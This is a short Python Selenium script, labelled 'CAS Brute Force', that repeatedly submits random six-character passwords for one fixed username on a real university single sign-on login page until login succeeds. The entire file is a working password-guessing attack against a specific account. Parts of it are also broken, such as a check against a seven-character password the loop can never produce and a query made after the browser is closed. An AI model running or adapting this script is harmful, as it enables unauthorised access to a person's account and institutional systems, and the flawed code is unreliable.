from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time
import random
import os

driver = webdriver.Chrome('./chromedriver.exe')

driver.get("https://sso.upi.edu/cas/login?service=https%3A%2F%2Fspot.upi.edu%2Fberanda")

os.system("cls")
print("CAS Brute Force by Asada")
print("Starting in 3 sec")
time.sleep(3)

usernameSelector = driver.find_element(By.ID, "username")
usernameSelector.send_keys("2109708")

alhpanum = "abcdefghijklmnopqrstuvwxyz1234567890"
passwordTxt = ""
tries = 1
while True:
  for i in range(6):
    passwordTxt += random.choice(alhpanum)
  passwordSelector = driver.find_element(By.ID, "password")
  passwordSelector.send_keys(passwordTxt)

  submit = driver.find_element(By.NAME, "submit")
  submit.click()

  print(str(tries) + "). " + passwordTxt)

  try:
    driver.find_element(By.CLASS_NAME, "mini-sidebar")
  except:
    if passwordTxt == "5f2c368":
      print("found but not detected")
      break
    passwordTxt = ""
    tries += 1
    continue
  break

print("success!, Password is " + passwordTxt)
driver.close()





time.sleep(5)
print(driver.find_element(By.CLASS_NAME, "mini-sidebar").is_displayed())
